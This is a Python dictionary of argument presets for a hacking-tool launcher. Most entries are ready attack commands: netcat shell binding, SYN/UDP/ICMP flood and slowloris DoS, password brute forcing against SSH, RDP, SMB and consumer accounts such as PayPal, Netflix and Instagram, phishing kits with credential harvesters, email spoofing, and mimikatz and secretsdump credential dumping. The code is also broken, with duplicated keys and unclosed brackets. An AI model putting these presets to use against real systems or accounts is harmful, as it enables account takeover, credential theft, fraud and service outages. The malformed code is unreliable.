BUILTIN_ARGS = {
    # === EXISTING TOOLS (KEPT) ===
    "nmap": [
        ("-sS", "SYN stealth scan"), ("-sT", "TCP connect scan"), ("-sU", "UDP scan"),
        ("-sV", "Version detection"), ("-sC", "Default scripts"), ("-O", "OS detection"),
        ("-p-", "All ports"), ("-F", "Fast scan"), ("-A", "Aggressive"),
        ("--script vuln", "Vuln scan"), ("-T4", "Speed T4"), ("-Pn", "Skip ping"),
        ("-oN output.txt", "Save output"), ("-v", "Verbose")
    ],
    "hydra": [
        ("-l admin -P wordlist.txt", "Single user"), ("-L users.txt -P pass.txt", "User list"),
        ("ssh://", "SSH"), ("ftp://", "FTP"), ("http-post-form://", "HTTP POST"),
        ("-t 16", "16 threads"), ("-f", "Stop on first")
    ],
    "sqlmap": [
        ("-u", "Target URL"), ("--dbs", "Enumerate DBs"), ("--tables", "Enumerate tables"),
        ("--dump", "Dump data"), ("--batch", "Auto answers"), ("--os-shell", "OS shell"),
        ("--level=5", "Max level"), ("--risk=3", "Max risk")
    ],
    "john": [
        ("--wordlist=rockyou.txt", "Rockyou"), ("--format=raw-md5", "MD5"),
        ("--format=raw-sha256", "SHA256"), ("--incremental", "Incremental"),
        ("--show", "Show cracked")
    ],
    "hashcat": [
        ("-m 0", "MD5"), ("-m 1000", "NTLM"), ("-m 2500", "WPA"),
        ("-a 0", "Dictionary"), ("-a 3", "Brute force"), ("-O", "Optimized")
    ],
#     "curl": [
#         ("-I https://target.com", "Headers only"),
#         ("-v https://target.com", "Verbose"),
#         ("-L https://target.com", "Follow redirects"),
#         ("-X POST -d user=admin https://target.com/login", "POST data"),
#         ("-H 'Content-Type: application/json' https://target.com/api", "JSON API"),
#         ("-x http://proxy:8080 https://target.com", "Via proxy"),
#         ("-k https://target.com", "Ignore SSL errors"),
#         ("-u admin:password https://target.com", "Basic auth"),
#     ],
    "gobuster": [
        ("dir -u", "Directory mode"), ("dns -d", "DNS mode"),
        ("-w /usr/share/wordlists/dirb/common.txt", "Common list"),
        ("-x php,html,txt", "Extensions"), ("-t 50", "50 threads")
    ],
    "nikto": [
        ("-h", "Target"), ("-ssl", "Force SSL"), ("-Tuning 1", "Files"),
        ("-o report.html", "HTML output")
    ],
    "wpscan": [
        ("--url", "Target URL"), ("--enumerate p", "Plugins"),
        ("--enumerate u", "Users"), ("--password-attack wp-login", "Password attack")
    ],
    "dirb": [
        ("http://target.com", "Target"), ("/usr/share/wordlists/dirb/common.txt", "Common"),
        ("-X .php,.html", "Extensions"), ("-w", "No warnings")
    ],
    "ffuf": [
        ("-u", "URL with FUZZ"), ("-w wordlist.txt", "Wordlist"),
        ("-H 'Host: FUZZ'", "Header fuzz"), ("-t 100", "100 threads"),
        ("-mc 200,301", "Match codes"), ("-fc 404", "Filter 404")
    ],
    "dig": [
        ("A", "IPv4"), ("MX", "Mail"), ("NS", "Nameservers"), ("ANY", "All"),
        ("+short", "Short output")
    ],
    "netcat": [
        ("-lvp 4444", "Listen"), ("-v target 80", "Connect"),
        ("-e /bin/bash", "Shell"), ("-z 1-1000", "Port scan")
    ],
    "tcpdump": [
        ("-i any", "All interfaces"), ("-n", "No DNS"), ("-w capture.pcap", "Save"),
        ("port 80", "HTTP only")
    ],
    "aircrack-ng": [
        ("-w rockyou.txt", "Wordlist"), ("-b", "BSSID"), ("capture.cap", "File")
    ],
    "exiftool": [
        ("image.jpg", "Read"), ("-all=", "Delete all"), ("-json", "JSON output")
    ],
    "binwalk": [
        ("file.bin", "Scan"), ("-e", "Extract"), ("-Me", "Recursive extract")
    ],
    "steghide": [
        ("embed -cf cover.jpg -ef secret.txt", "Embed"),
        ("extract -sf stego.jpg", "Extract")
    ],
    "strings": [
        ("file.bin", "Read"), ("-n 8", "Min length 8")
    ],
    "crunch": [
        ("8 8 -t @@@@%%%%", "Pattern"), ("6 8 0123456789", "Numeric")
    ],
    "msfconsole": [
        ("-q", "Quiet"), ("-x 'use multi/handler; set PAYLOAD; set LHOST; set LPORT; run'", "Handler")
    ],
    "ettercap": [
        ("-T", "Text mode"), ("-M arp:remote", "ARP poison")
    ],
    "whatweb": [
        ("-v", "Verbose"), ("-a 3", "Aggressive")
    ],
    "traceroute": [
        ("-n", "No DNS"), ("-I", "ICMP")
    ],
    "ping": [
        ("-c 4", "4 packets"), ("-f", "Flood")
    ],
    
    # === NEW TOOLS ===
    # STRENGTH CHECKER / HASH GENERATOR / MD5 CRACKER
    "hash-identifier": [
        ("hash.txt", "Identify hash"), ("-h", "Help")
    ],
    "hashid": [
        ("hash", "Identify hash"), ("-m", "Show hashcat mode"), ("-j", "Show john format")
    ],
    "md5sum": [
        ("file.txt", "MD5 file"), ("-c", "Check"), ("-b", "Binary")
    ],
    "sha256sum": [
        ("file.txt", "SHA256 file")
    ],
    "base64": [
        ("file.txt", "Encode"), ("-d file.b64", "Decode"), ("-w 0", "No wrap")
    ],
    
    # PORT SCANNER / DNS RECON / IP INTELLIGENCE / WEB HEADER SCAN
    "masscan": [
        ("-p80,443 192.168.1.0/24", "Web ports"), ("-p1-65535", "All ports"),
        ("--rate=1000", "Rate limit"), ("-oJ output.json", "JSON output")
    ],
    "rustscan": [
        ("-a 192.168.1.1", "Target"), ("-p 1-1000", "Port range"),
        ("--ulimit 5000", "Ulimit"), ("-t 2000", "Timeout")
    ],
    "whois": [
        ("-H", "No legal"), ("-a", "ARIN")
    ],
    "dnsrecon": [
        ("-d domain.com", "Domain"), ("-t axfr", "Zone transfer"),
        ("-t std", "Standard"), ("-D wordlist.txt", "Dictionary")
    ],
    "dnsenum": [
        ("domain.com", "Target"), ("-f wordlist.txt", "Wordlist")
    ],
    
    # LSB STEGANOGRAPHY / METADATA EXTRACTOR
    "zsteg": [
        ("image.png", "Analyze"), ("-a", "All methods"), ("-E file.txt", "Extract")
    ],
    "stegsolve": [
        ("image.png", "Analyze")
    ],
    "stegcracker": [
        ("stego.jpg wordlist.txt", "Crack"), ("-o output.txt", "Output")
    ],
    "foremost": [
        ("-i file.dd", "Input"), ("-o output/", "Output"), ("-t all", "All types")
    ],
    "bulk_extractor": [
        ("-o output/", "Output"), ("image.dd", "Input"), ("-e all", "All extractors")
    ],
    
    # CUSTOMIZABLE BRUTE FORCE / PHISHING DETECTOR / MALWARE SANDBOX
    "hydra": [
        ("-l admin -P pass.txt ssh://target", "SSH brute"),
        ("-L users.txt -P pass.txt ftp://target", "FTP brute"),
        ("-l admin -P pass.txt http-post-form://target/login:user=^USER^&pass=^PASS^:F=incorrect", "HTTP form"),
    ],
    "medusa": [
        ("-h target -u admin -P pass.txt -M ssh", "SSH"),
        ("-h target -U users.txt -P pass.txt -M ftp", "FTP"),
        ("-h target -u admin -P pass.txt -M http", "HTTP")
    ],
    "ncrack": [
        ("-p 22 --user admin -P pass.txt target", "SSH"),
        ("-p 21 --user admin -P pass.txt target", "FTP"),
        ("-p 3389 --user admin -P pass.txt target", "RDP")
    ],
    "patator": [
        ("ssh_login host=target user=admin password=FILE0 0=pass.txt", "SSH"),
        ("ftp_login host=target user=admin password=FILE0 0=pass.txt", "FTP")
    ],
    
    # SECURE FILE SHREDDER (MULTI-PASS)
    "shred": [
        ("-n 7 file.txt", "7 passes"), ("-z file.txt", "Zero final"),
        ("-u file.txt", "Remove after"), ("-v file.txt", "Verbose")
    ],
    "wipe": [
        ("-f file.txt", "Force"), ("-r directory/", "Recursive"),
        ("-q", "Quick")
    ],
    "dd": [
        ("if=/dev/urandom of=file bs=1M count=10", "Random overwrite"),
        ("if=/dev/zero of=file bs=1M count=10", "Zero overwrite")
    ],
    "srm": [
        ("-v file.txt", "Verbose"), ("-r directory/", "Recursive"),
        ("-l", "Lessen"), ("-f", "Fast")
    ],
    
    # DoS TOOLS
    "hping3": [
        ("-S target -p 80 --flood", "SYN flood"), ("-S target -p 443 --flood", "HTTPS flood"),
        ("--udp target -p 53 --flood", "UDP flood"), ("-1 target --flood", "ICMP flood"),
        ("-S target -p 80 --rand-source", "Random source")
    ],
    "slowloris": [
        ("-p 80 target", "HTTP slow"), ("-p 443 target --https", "HTTPS slow"),
        ("-s 500", "500 sockets"), ("--sleeptime 10", "Sleep time")
    ],
    "goldeneye": [
        ("target -w 100 -s 200", "100 workers"), ("target -w 500", "500 workers"),
        ("-m random", "Random method")
    ],
    "ab": [
        ("-n 1000 -c 10 http://target/", "1000 requests"),
        ("-n 10000 -c 100 http://target/", "10K requests"),
        ("-t 30 -c 10 http://target/", "30 second test")
    ],
    "siege": [
        ("-c 100 -t 30s http://target", "100 users 30s"),
        ("-c 200 -r 50 http://target", "200 users 50 reps"),
        ("-f urls.txt", "URL file")
    ],
    
    # ADDITIONAL SECURITY TOOLS
    "lynis": [
        ("audit system", "System audit"), ("--quick", "Quick scan"),
        ("--pentest", "Pentest mode")
    ],
    "chkrootkit": [
        ("-q", "Quiet"), ("-x", "Expert")
    ],
    "rkhunter": [
        ("--check", "Check"), ("--update", "Update"), ("--sk", "Skip keypress")
    ],
    "clamscan": [
        ("-r /", "Scan root"), ("-r --bell", "Alert"), ("--remove", "Remove malware")
    ],
    "testssl.sh": [
        ("https://target.com", "Full test"), ("--each-cipher", "Each cipher"),
        ("--json", "JSON output")
    ],
    "sslscan": [
        ("target:443", "Target"), ("--no-failed", "No failed"), ("--xml=out.xml", "XML")
    ],
    "sslyze": [
        ("--regular target.com", "Regular scan"), ("--json_out out.json", "JSON")
    ],


    # === SOCIAL MEDIA BRUTE FORCE ===
    "sherlock": [
        ("username", "Search username"), ("--output results/", "Output folder"),
        ("--csv", "CSV output"), ("--xlsx", "XLSX output"),
        ("--site twitter", "Twitter only"), ("--site instagram", "Instagram only"),
        ("--site facebook", "Facebook only"), ("--site all", "All 300+ sites"),
        ("--timeout 5", "5s timeout"), ("-t 20", "20 threads"),
        ("--print-found", "Print found only"), ("--nsfw", "Include NSFW"),
    ],
    "holehe": [
        ("email@test.com", "Check email"), ("--only-used", "Only registered"),
        ("-o output.csv", "CSV output"), ("-p", "Print results"),
    ],
    "instashell": [
        ("-u username", "Target user"), ("-p password", "Single password"),
        ("-f list.txt", "Password list"), ("-t 10", "10 threads"),
        ("--proxy 127.0.0.1:8080", "Use proxy"),
    ],
    "instagram-brute": [
        ("-u username", "Target"), ("-p pass.txt", "Password list"),
        ("-t 10", "Threads"), ("--proxy proxy:port", "Proxy"),
    ],
    "facebook-brute": [
        ("-u user@email.com", "Email/ID"), ("-p pass.txt", "Password list"),
        ("-t 10", "Threads"), ("--proxy proxy:port", "Proxy"),
    ],
    "twitter-brute": [
        ("-u username", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"), ("--proxy proxy:port", "Proxy"),
    ],
    "tiktok-brute": [
        ("-u username", "Target"), ("-p pass.txt", "Password list"),
        ("-t 10", "Threads"),
    ],
    "snapchat-brute": [
        ("-u username", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"),
    ],
    "linkedin-brute": [
        ("-u email@test.com", "Target email"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"), ("--proxy proxy:port", "Proxy"),
    ],
    "github-brute": [
        ("-u username", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"),
    ],
    "reddit-brute": [
        ("-u username", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"),
    ],
    "pinterest-brute": [
        ("-u email@test.com", "Target"), ("-p pass.txt", "Password list"),
        ("-t 10", "Threads"),
    ],
    "tumblr-brute": [
        ("-u email@test.com", "Target"), ("-p pass.txt", "Password list"),
        ("-t 10", "Threads"),
    ],
    "spotify-brute": [
        ("-u email@test.com", "Target"), ("-p pass.txt", "Password list"),
        ("-t 10", "Threads"),
    ],
    "netflix-brute": [
        ("-u email@test.com", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"),
    ],
    "hulu-brute": [
        ("-u email@test.com", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"),
    ],
    "amazon-brute": [
        ("-u email@test.com", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"), ("--proxy proxy:port", "Proxy"),
    ],
    "paypal-brute": [
        ("-u email@test.com", "Target"), ("-p pass.txt", "Password list"),
        ("-t 3", "Threads"), ("--proxy proxy:port", "Proxy"),
    ],
    "ebay-brute": [
        ("-u username", "Target"), ("-p pass.txt", "Password list"),
        ("-t 5", "Threads"),
    ],
    "wordpress-brute": [
        ("--url http://target.com", "Target URL"), ("--usernames admin", "Single user"),
        ("-U users.txt", "User list"), ("-P pass.txt", "Password list"),
        ("-t 10", "Threads"), ("--proxy proxy:port", "Proxy"),
    ],
    "joomla-brute": [
        ("-u http://target.com", "Target URL"), ("-w admin", "Username"),
        ("-p pass.txt", "Password list"), ("-t 10", "Threads"),
    ],
    "drupal-brute": [
        ("-u http://target.com", "Target URL"), ("-U users.txt", "User list"),
        ("-P pass.txt", "Password list"), ("-t 10", "Threads"),
    ],
    "magento-brute": [
        ("-u http://target.com", "Target"), ("-U users.txt", "Users"),
        ("-P pass.txt", "Passwords"), ("-t 10", "Threads"),
    ],
    "prestashop-brute": [
        ("-u http://target.com", "Target"), ("-U users.txt", "Users"),
        ("-P pass.txt", "Passwords"), ("-t 10", "Threads"),
    ],



    # === POWERFUL PHISHING TOOLKITS ===
    "evilginx2": [
        ("-p phishlet", "Phishlet name"), ("-t target.com", "Target domain"),
        ("-g group", "Phishlet group"), ("--debug", "Debug mode"),
        ("--developer", "Developer mode"), ("-c config.json", "Config file"),
        ("-w watch_dir", "Watch directory"), ("--no-database", "No DB"),
        ("--https-port 443", "HTTPS port"), ("--dns-port 53", "DNS port"),
    ],
    "gophish": [
        ("--port 3333", "Admin port"), ("--config config.json", "Config"),
        ("-v", "Verbose"), ("--no-console", "No console"),
        ("--reset-db", "Reset database"), ("--import-csv targets.csv", "Import targets"),
    ],
    "modlishka": [
        ("-config config.json", "Config file"), ("-proxy target.com", "Proxy target"),
        ("-listeningAddress 0.0.0.0", "Listen"), ("-port 443", "Port"),
        ("-plugins all", "All plugins"), ("-trackingParam id", "Tracking param"),
        ("-jsRules 'replace'", "JS rules"), ("-cert email@test.com", "Auto cert"),
    ],
    "muraena": [
        ("-config config.toml", "Config"), ("-phish phish.toml", "Phish config"),
        ("-t target.com", "Target"), ("-v", "Verbose"),
        ("-debug", "Debug"), ("-no-browser", "No browser"),
        ("-workers 10", "10 workers"), ("-timeout 30", "30s timeout"),
    ],
    "zphisher": [
        ("-p", "Pick page"), ("-t", "Tunnel option"), ("-o", "Open port"),
        ("-l", "Localhost"), ("--ngrok", "Ngrok tunnel"),
        ("--cloudflared", "Cloudflare tunnel"), ("--localXpose", "LocalXpose"),
    ],
    "blackeye": [
        ("-p", "Pick page"), ("-t", "Tunnel"), ("-s", "Server"),
        ("-i", "Install"), ("-u", "Update"), ("-c", "Check"),
    ],
    "socialfish": [
        ("-u", "Update"), ("-c", "Check creds"), ("-r", "Run server"),
        ("-p 8080", "Port"), ("--ssl", "Enable SSL"),
        ("--tunnel ngrok", "Ngrok tunnel"), ("--tunnel localhost", "Local only"),
    ],
    "setoolkit": [
        ("-s", "Social engineering"), ("-p", "Phishing vectors"),
        ("-w", "Website vectors"), ("-q", "Quick track"),
        ("-m", "Mass mailer"), ("-c", "Credential harvester"),
        ("-t", "Tabnabbing"), ("-j", "Java applet"),
        ("-k", "Ettercap"), ("-a", "Arduino attack"),
    ],
    "credphisher": [
        ("-u", "Update"), ("-s", "Start server"), ("-p 8080", "Port"),
        ("--ssl", "SSL"), ("--tunnel", "Tunnel mode"),
    ],
    "phishim": [
        ("-t office365", "Office365"), ("-t gmail", "Gmail"),
        ("-t outlook", "Outlook"), ("-t yahoo", "Yahoo"),
        ("-p 8080", "Port"), ("--ssl", "SSL"),
    ],
    "king-phisher": [
        ("--server", "Start server"), ("--config config.yml", "Config"),
        ("--debug", "Debug"), ("--restore", "Restore session"),
    ],
    "sneakemail": [
        ("-f spoof@test.com", "From"), ("-t target@test.com", "To"),
        ("-s 'Subject'", "Subject"), ("-b 'Body'", "Body"),
        ("-a attachment.pdf", "Attachment"), ("-h smtp.server.com", "SMTP"),
    ],
    "swaks": [
        ("--to target@test.com", "To"), ("--from spoof@test.com", "From"),
        ("--server smtp.gmail.com", "SMTP"), ("--header 'Subject: Test'", "Subject"),
        ("--body 'Test body'", "Body"), ("--attach file.pdf", "Attachment"),
        ("--tls", "Use TLS"), ("--auth LOGIN", "Auth type"),
    ],
    "hiddeneye": [
        ("-p", "Pick page"), ("-t", "Tunnel"), ("-s", "Server"),
        ("-i", "Install"), ("-u", "Update"),
    ],
    "shellphish": [
        ("-p", "Pick page"), ("-t", "Tunnel"), ("-o", "Port"),
        ("-l", "Localhost"), ("--ngrok", "Ngrok"),
    ],
    "advphishing": [
        ("-p", "Pick page"), ("-t", "Tunnel"), ("-s", "Server"),
        ("-i", "Install"), ("--ngrok", "Ngrok tunnel"),
    ],
    "mrphish": [
        ("-p", "Pick page"), ("-t", "Tunnel"), ("-o", "Port"),
        ("--ngrok", "Ngrok"), ("--cloudflared", "Cloudflare"),
    ],



    # === PRE-BUILT EXAMPLES - NORMAL TO BRUTE FORCE ===
    "nmap": [
        ("-F target.com", "Fast scan top 100 ports"),
        ("-sV target.com", "Service version detection"),
        ("-sC target.com", "Default scripts"),
        ("-sV -sC -O target.com", "Full audit"),
        ("-p- target.com", "All 65535 ports"),
        ("-p 1-1000 target.com", "Top 1000 ports"),
        ("-sS -T4 target.com", "Stealth SYN scan"),
        ("-sU target.com", "UDP scan"),
        ("--script vuln target.com", "Vulnerability scan"),
        ("--script brute target.com", "Brute force scripts"),
        ("--script exploit target.com", "Exploit detection"),
        ("--script auth target.com", "Auth bypass scan"),
        ("-A -T4 target.com", "Aggressive scan"),
        ("-sV --script vuln -p- target.com", "Full vuln audit"),
        ("-sn 192.168.1.0/24", "Ping sweep network"),
    ],
    "gobuster": [
        ("dir -u http://target.com -w wordlist.txt", "Directory brute"),
        ("dns -d target.com -w wordlist.txt", "DNS subdomain brute"),
        ("vhost -u http://target.com -w wordlist.txt", "Virtual host brute"),
        ("dir -u http://target.com -w wordlist.txt -x php,html,txt", "With extensions"),
        ("dir -u http://target.com -w wordlist.txt -t 100", "100 threads"),
        ("dir -u http://target.com -w wordlist.txt -k", "Skip SSL verify"),
    ],
    "hydra": [
        ("-l admin -P rockyou.txt ssh://target", "SSH single user brute"),
        ("-L users.txt -P pass.txt ssh://target", "SSH user list brute"),
        ("-l admin -P pass.txt ftp://target", "FTP brute"),
        ("-l root -P pass.txt mysql://target", "MySQL brute"),
        ("-L users.txt -P pass.txt http-post-form://target/login:user=^USER^&pass=^PASS^:F=error", "HTTP form brute"),
        ("-L users.txt -P pass.txt smb://target", "SMB brute"),
        ("-l admin -P pass.txt rdp://target", "RDP brute"),
        ("-L users.txt -P pass.txt mssql://target", "MSSQL brute"),
        ("-l admin -P pass.txt telnet://target", "Telnet brute"),
        ("-t 16 -f -V -l admin -P pass.txt ssh://target", "Fast single user brute"),
    ],
    "sqlmap": [
        ("-u http://target.com/page.php?id=1", "Basic test"),
        ("-u http://target.com/page.php?id=1 --dbs", "Enumerate databases"),
        ("-u http://target.com/page.php?id=1 -D db --tables", "Enumerate tables"),
        ("-u http://target.com/page.php?id=1 -D db -T users --dump", "Dump table"),
        ("-u http://target.com/page.php?id=1 --batch", "Auto answers"),
        ("-u http://target.com/page.php?id=1 --level=5 --risk=3", "Max level/risk"),
        ("-u http://target.com/page.php?id=1 --os-shell", "OS shell attempt"),
        ("-u http://target.com/page.php?id=1 --tamper=space2comment", "WAF bypass"),
        ("-r request.txt -p id", "From request file"),
        ("--dbs --tables --columns --dump --batch", "Full auto dump"),
    ],
    "john": [
        ("--wordlist=rockyou.txt hash.txt", "Dictionary attack"),
        ("--rules --wordlist=rockyou.txt hash.txt", "Rules attack"),
        ("--incremental hash.txt", "Incremental brute"),
        ("--format=raw-md5 hash.txt", "MD5 format"),
        ("--format=raw-sha256 hash.txt", "SHA256 format"),
        ("--show hash.txt", "Show cracked"),
    ],
    "hashcat": [
        ("-m 0 -a 0 hash.txt rockyou.txt", "MD5 dictionary"),
        ("-m 0 -a 3 hash.txt ?l?l?l?l?l?l", "MD5 mask brute 6 lower"),
        ("-m 1000 -a 0 hash.txt rockyou.txt", "NTLM dictionary"),
        ("-m 2500 -a 0 hash.hc22000 rockyou.txt", "WPA dictionary"),
        ("-m 0 -a 0 hash.txt rockyou.txt -O -w 4", "Optimized max power"),
        ("-m 0 -a 3 hash.txt ?a?a?a?a?a?a?a?a", "8 char all charset brute"),
    ],
    "ffuf": [
        ("-u http://target.com/FUZZ -w wordlist.txt", "Directory fuzz"),
        ("-u http://target.com/FUZZ -w wordlist.txt -mc 200,301", "Match codes"),
        ("-u http://target.com/FUZZ -w wordlist.txt -fc 404", "Filter 404"),
        ("-u http://target.com/FUZZ -w wordlist.txt -t 200", "200 threads"),
        ("-u http://target.com/api/FUZZ -w api.txt -H 'Content-Type: application/json'", "API fuzz"),
        ("-u http://FUZZ.target.com -w subdomains.txt", "Subdomain fuzz"),
    ],
    "curl": [
        ("-I https://target.com", "Headers only"),
        ("-v https://target.com", "Verbose"),
        ("-L https://target.com", "Follow redirects"),
        ("-X POST -d 'user=admin&pass=test' https://target.com/login", "POST data"),
#         ("-H 'Content-Type: application/json' -d '{key:value}' https://target.com/api", "JSON API"),

    # === MORE PRE-BUILT EXAMPLES ===
    "masscan": [
        ("-p80,443 192.168.1.0/24 --rate=1000", "Web ports fast"),
        ("-p1-65535 target.com --rate=5000", "All ports fast"),
        ("-p22,80,443,8080,8443 target.com", "Common ports"),
        ("-p- target.com --rate=10000", "Full port max speed"),
        ("-p80,443 192.168.1.0/24 -oJ scan.json", "JSON output"),
    ],
    "rustscan": [
        ("-a target.com", "Fast scan"),
        ("-a target.com -p 1-1000", "Port range"),
        ("-a target.com --ulimit 5000 -t 2000", "Max speed"),
        ("-a 192.168.1.0/24 -p 22,80,443", "Network scan"),
    ],
    "amass": [
        ("enum -d target.com", "Basic enum"),
        ("enum -passive -d target.com", "Passive only"),
        ("enum -active -d target.com", "Active enum"),
        ("enum -d target.com -o output.txt", "Save output"),
        ("intel -d target.com", "Intelligence gather"),
    ],
    "subfinder": [
        ("-d target.com", "Basic subdomain"),
        ("-d target.com -silent", "Silent mode"),
        ("-d target.com -o subs.txt", "Save to file"),
        ("-dL domains.txt -o all_subs.txt", "Bulk domains"),
    ],
    "httpx": [
        ("-l subs.txt -o live.txt", "Check live hosts"),
        ("-l subs.txt -status-code -title", "Status and title"),
        ("-l subs.txt -tech-detect", "Tech detection"),
        ("-l subs.txt -silent -o live.txt", "Silent output"),
    ],
    "nuclei": [
        ("-u http://target.com", "Basic scan"),
        ("-u http://target.com -severity critical,high", "Critical/High only"),
        ("-l targets.txt -t cves/", "CVE templates"),
        ("-u http://target.com -t exposures/", "Exposure scan"),
        ("-u http://target.com -o report.txt", "Save report"),
    ],
    "wapiti": [
        ("-u http://target.com", "Basic scan"),
        ("-u http://target.com --scope page", "Page scope"),
        ("-u http://target.com -f txt -o report", "TXT report"),
    ],
    "skipfish": [
        ("-o /tmp/output http://target.com", "Basic scan"),
        ("-o /tmp/output -I target.com http://target.com", "Target only"),
    ],
    "testssl": [
        ("https://target.com", "Full test"),
        ("--each-cipher https://target.com", "Each cipher"),
        ("--json https://target.com", "JSON output"),
        ("--parallel https://target.com", "Fast parallel"),
    ],
    "sslyze": [
        ("--regular target.com", "Regular scan"),
        ("--json_out out.json target.com", "JSON output"),
    ],
    "responder": [
        ("-I eth0", "Start on eth0"),
        ("-I wlan0 -rdwv", "Full mode WiFi"),
        ("-I eth0 -A", "Analyze mode"),
    ],
    "impacket": [
        ("psexec.py domain/user:pass@target", "PSExec"),
        ("wmiexec.py domain/user:pass@target", "WMIExec"),
        ("smbexec.py domain/user:pass@target", "SMBExec"),
        ("secretsdump.py domain/user:pass@target", "Dump secrets"),
        ("ntlmrelayx.py -t smb://target -smb2support", "NTLM relay"),
    ],
    "crackmapexec": [
        ("smb target -u user -p pass", "SMB check"),
        ("smb 192.168.1.0/24 -u user -p pass --shares", "Network shares"),
        ("winrm target -u user -p pass -x 'whoami'", "WinRM exec"),
        ("mssql target -u sa -p password", "MSSQL check"),
    ],
    "bloodhound": [
        ("-d domain -u user -p pass -ns nameserver -c all", "Full collection"),
        ("-d domain -u user -p pass -ns nameserver", "Basic collection"),
    ],
    "mimikatz": [
        ("privilege::debug sekurlsa::logonpasswords", "Dump passwords"),
        ("lsadump::sam", "Dump SAM"),
        ("lsadump::secrets", "Dump secrets"),
        ("token::elevate", "Elevate token"),
    ],
    "chisel": [
        ("server -p 8080 --reverse", "Server reverse"),
        ("client server:8080 R:4444:localhost:4444", "Client reverse"),
    ],
    "ligolo": [
        ("-bind 0.0.0.0:11601", "Start proxy"),
        ("-connect proxy:11601 -ignore-cert", "Connect agent"),
    ],
    "proxychains": [
        ("nmap -sT target.com", "Nmap via proxy"),
        ("curl target.com", "Curl via proxy"),
        ("firefox", "Browser via proxy"),
    ],
    "torify": [
        ("nmap -sT target.com", "Nmap via Tor"),
        ("curl target.com", "Curl via Tor"),
    ],
    "wifite": [
        ("-i wlan0", "Basic scan"),
        ("-i wlan0 --wpa", "WPA only"),
        ("-i wlan0 --wep", "WEP only"),
        ("-i wlan0 --kill", "Kill interfering"),
    ],
    "reaver": [
        ("-i wlan0mon -b BSSID -vv", "WPS attack"),
        ("-i wlan0mon -b BSSID -c 6 -vv", "Specific channel"),
    ],
    "kismet": [
        ("-c wlan0", "Start capture"),
        ("-c wlan0 --no-server", "No web server"),
    ],
    "hping3": [
        ("-S target.com -p 80 --flood", "SYN flood"),
        ("--udp target.com -p 53 --flood", "UDP flood"),
        ("-1 target.com --flood", "ICMP flood"),
        ("-S target.com -p 80 --rand-source", "Random source SYN"),
    ],
    "slowloris": [
        ("-p 80 target.com", "HTTP slow"),
        ("-p 443 --https target.com", "HTTPS slow"),
        ("-s 500 target.com", "500 sockets"),
    ],
    "ab": [
        ("-n 1000 -c 100 http://target.com/", "1000 requests 100 concurrent"),
        ("-n 10000 -c 200 -t 30 http://target.com/", "30s stress test"),
    ],
    "siege": [
        ("-c 100 -t 30s http://target.com", "100 users 30s"),
        ("-c 200 -r 50 http://target.com", "200 users 50 reps"),
        ("-f urls.txt", "URL list file"),
    ],



    # === EVEN MORE PRE-BUILT EXAMPLES ===
    "burpsuite": [
        ("--project=project.burp", "Open project"),
        ("--config=config.json", "Load config"),
        ("--collaborator-server", "Start collaborator"),
        ("--unpause-spidering", "Resume spider"),
    ],
    "zaproxy": [
        ("-cmd -quickurl http://target.com", "Quick scan"),
        ("-daemon -port 8080", "Daemon mode"),
        ("-cmd -quickurl http://target.com -quickout report.html", "Quick with report"),
    ],
    "commix": [
        ("-u http://target.com/page.php?id=1", "Basic test"),
        ("-u http://target.com/page.php?id=1 --os=unix", "Unix target"),
        ("-u http://target.com/page.php?id=1 --technique=t", "Time-based"),
    ],
    "xsser": [
        ("-u http://target.com/page.php?q=test", "Basic XSS"),
        ("--auto -u http://target.com/page.php?q=test", "Auto mode"),
        ("-u http://target.com/page.php?q=test --Fp", "Final payload"),
    ],
    "xsstrike": [
        ("-u http://target.com/page.php?q=test", "Basic scan"),
        ("-u http://target.com/page.php?q=test --crawl", "Crawl mode"),
        ("-u http://target.com/page.php?q=test --fuzzer", "Fuzzer mode"),
        ("-u http://target.com/page.php?q=test --blind", "Blind XSS"),
    ],
    "dalfox": [
        ("url http://target.com/page.php?q=test", "Basic scan"),
        ("url http://target.com/page.php?q=test --cookie 'session=xxx'", "With cookie"),
        ("file urls.txt", "Bulk URLs"),
    ],
    "nosqlmap": [
        ("-u http://target.com/api", "Basic scan"),
        ("-u http://target.com/api --mongodb", "MongoDB target"),
        ("-u http://target.com/api --dump", "Dump data"),
    ],
    "arjun": [
        ("-u http://target.com/page.php", "Find params"),
        ("-u http://target.com/page.php -t 20", "20 threads"),
        ("-u http://target.com/api --json", "JSON output"),
    ],
    "paramspider": [
        ("-d target.com", "Domain scan"),
        ("-d target.com -o output.txt", "Save output"),
    ],
    "kiterunner": [
        ("scan http://target.com -w routes.kite", "API scan"),
        ("discover http://target.com -w routes.kite", "Discover mode"),
    ],
    "feroxbuster": [
        ("-u http://target.com -w wordlist.txt", "Directory brute"),
        ("-u http://target.com -w wordlist.txt -t 100", "100 threads"),
        ("-u http://target.com -w wordlist.txt -x php,html,txt", "Extensions"),
    ],
    "dirsearch": [
        ("-u http://target.com -w wordlist.txt", "Directory scan"),
        ("-u http://target.com -e php,html,txt -t 50", "Extensions"),
        ("-u http://target.com --json-report report.json", "JSON report"),
    ],
    "trivy": [
        ("image nginx:latest", "Scan image"),
        ("fs /", "Filesystem scan"),
        ("repo https://github.com/user/repo", "Repo scan"),
        ("--severity CRITICAL,HIGH image nginx:latest", "Critical only"),
    ],
    "grype": [
        ("nginx:latest", "Scan image"),
        ("dir:/app", "Directory scan"),
        ("-o json nginx:latest", "JSON output"),
    ],
    "dockle": [
        ("nginx:latest", "Check image"),
        ("--ignore CIS-DI-0001 nginx:latest", "Ignore check"),
    ],
    "hadolint": [
        ("Dockerfile", "Lint Dockerfile"),
        ("--ignore DL3008 Dockerfile", "Ignore rule"),
    ],
    "clair": [
        ("--config config.yaml", "With config"),
        ("--ip 0.0.0.0 --port 6060", "Custom port"),
    ],
    "kube-hunter": [
        ("--remote target.com", "Remote scan"),
        ("--active", "Active hunting"),
        ("--pod", "Inside pod"),
        ("--cidr 192.168.1.0/24", "Network range"),
    ],
    "kube-bench": [
        ("--config-dir /etc/kubernetes", "Config dir"),
        ("--version 1.20", "K8s version"),
        ("--check 1.1.1", "Single check"),
    ],
